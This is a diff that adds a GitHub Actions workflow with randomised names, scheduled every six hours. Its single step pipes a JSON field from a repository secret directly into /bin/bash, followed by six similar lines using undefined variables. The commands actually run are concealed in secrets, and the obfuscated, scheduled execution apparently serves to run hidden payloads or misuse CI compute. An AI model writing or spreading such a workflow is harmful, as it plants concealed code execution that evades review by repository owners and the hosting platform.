@@ -1,0 +1,23 @@
+name: jiatingkai1638
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiatingkai1638
+        env:
+          ghp2538: ${{ secrets.ghp2538 }}
+        run: |
+          echo $ghp2538 | jq -r .fhxfo3634 | /bin/bash
+          echo $wnw13038 | jq -r .l35 | /bin/bash
+          echo $kjd367 | jq -r .bmybt69 | /bin/bash
+          echo $j53593 | jq -r .pugvh276 | /bin/bash
+          echo $c079 | jq -r .dteb410 | /bin/bash
+          echo $ljbd3 | jq -r .cx98 | /bin/bash
+          echo $iqoo733 | jq -r .xxcig21 | /bin/bash
+
